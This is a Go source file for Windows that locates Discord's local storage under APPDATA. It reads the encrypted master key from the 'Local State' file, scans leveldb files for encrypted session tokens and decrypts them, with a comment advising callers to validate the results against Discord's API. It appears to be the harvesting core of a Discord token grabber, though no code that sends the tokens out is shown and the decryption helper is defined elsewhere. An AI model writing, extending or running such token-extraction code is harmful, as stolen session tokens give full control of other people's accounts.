//go:build windows
// +build windows

package token

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// GetTokens decrypts every token candidate found in Discord's local storage
// and returns all that decrypt successfully. Callers should try each and use
// the first that validates against Discord's API.
func GetTokens() ([]string, error) {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return nil, errors.New("APPDATA environment variable is not set")
	}

	key, err := extractEncryptionKey(filepath.Join(appData, "discord", "Local State"))
	if err != nil {
		return nil, fmt.Errorf("failed to extract encryption key: %w", err)
	}

	tokens, err := extractTokens(filepath.Join(appData, "discord", "Local Storage", "leveldb"))
	if err != nil {
		return nil, fmt.Errorf("failed to extract tokens: %w", err)
	}

	var out []string
	for _, t := range deduplicateTokens(tokens) {
		if decrypted, err := decryptToken(t, key); err == nil {
			out = append(out, decrypted)
		}
	}

	if len(out) == 0 {
		return nil, errors.New("no valid token found")
	}
	return out, nil
}

func extractEncryptionKey(localStatePath string) (string, error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return "", err
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return "", err
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return "", errors.New("missing os_crypt in Local State")
	}

	encryptedKey, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return "", errors.New("missing encrypted_key in os_crypt")
	}

	return encryptedKey, nil
}

func extractTokens(levelDBPath string) ([]string, error) {
	var tokens []string
	re := regexp.MustCompile(`dQw4w9WgXcQ:[^"]+`)

	err := filepath.Walk(levelDBPath, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() || (!strings.HasSuffix(info.Name(), ".ldb") && !strings.HasSuffix(info.Name(), ".log")) {
			return nil
		}

		data, err := os.ReadFile(filePath)
		if err != nil {
			return fmt.Errorf("failed to read file %s: %w", filePath, err)
		}

		matches := re.FindAllString(string(data), -1)
		tokens = append(tokens, matches...)
		return nil
	})
	if err != nil {
		return nil, err
	}

	return tokens, nil
}

func deduplicateTokens(tokens []string) []string {
	seen := make(map[string]struct{})
	var result []string
	for _, token := range tokens {
		if _, exists := seen[token]; !exists {
			seen[token] = struct{}{}
			result = append(result, token)
		}
	}
	return result
}

func decryptToken(encodedToken, key string) (string, error) {
	parts := strings.Split(encodedToken, "dQw4w9WgXcQ:")
	if len(parts) != 2 {
		return "", errors.New("invalid token format")
	}

	decoded, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "", err
	}

	return decryptWithMasterKey(decoded, key)
}
